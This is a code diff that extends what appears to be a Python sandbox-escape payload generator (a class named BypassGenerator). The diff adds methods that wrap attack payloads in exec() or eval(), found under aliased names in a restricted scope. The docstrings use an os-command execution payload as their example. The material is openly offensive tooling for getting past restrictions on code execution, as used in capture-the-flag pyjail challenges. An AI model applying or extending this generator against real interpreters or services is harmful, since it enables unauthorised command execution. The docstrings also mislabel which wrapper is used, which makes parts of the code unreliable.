@@ -642,3 +642,41 @@ class BypassGenerator:
         if self.allow_unicode_bypass:
             payload = self.unicode_bypasses(payload, '𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡')
         return payload
+    
+    @general_bypasser
+    def repr_to_exec(self, payload: str) -> str:
+        """
+        wraps the payload with exec()
+        __import__('os').system('ls') -> exec("__import__('os').popen('ls').read()")
+        """
+        from utils import find_object
+        name = find_object(exec, self.local_scope)
+        single_comma = payload.find("'")
+        double_comma = payload.find('"')
+        if single_comma > double_comma:
+            quote = '"'
+        elif double_comma > single_comma:
+            quote = "'"
+        else:
+            quote = "'"
+        return f"{name}({quote}{payload}{quote})"
+
+    @general_bypasser
+    def repr_to_eval(self, payload: str) -> str:
+        """
+        wraps the payload with exec()
+        __import__('os').system('ls') -> eval("__import__('os').popen('ls').read()")
+        """
+        if ';' in payload or '\n' in payload:
+            return payload
+        from utils import find_object
+        name = find_object(eval, self.local_scope)
+        single_comma = payload.find("'")
+        double_comma = payload.find('"')
+        if single_comma > double_comma:
+            quote = '"'
+        elif double_comma > single_comma:
+            quote = "'"
+        else:
+            quote = "'"
+        return f"{name}({quote}{payload}{quote})"
